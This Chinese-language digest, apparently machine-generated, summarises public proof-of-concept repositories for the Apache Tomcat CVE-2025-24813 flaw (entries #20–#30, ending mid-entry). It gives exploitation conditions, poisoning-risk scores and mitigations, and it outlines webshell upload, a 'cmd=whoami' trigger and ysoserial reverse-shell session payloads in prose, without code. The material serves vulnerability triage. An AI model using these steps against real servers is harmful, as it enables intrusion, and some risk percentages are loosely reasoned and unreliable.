**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

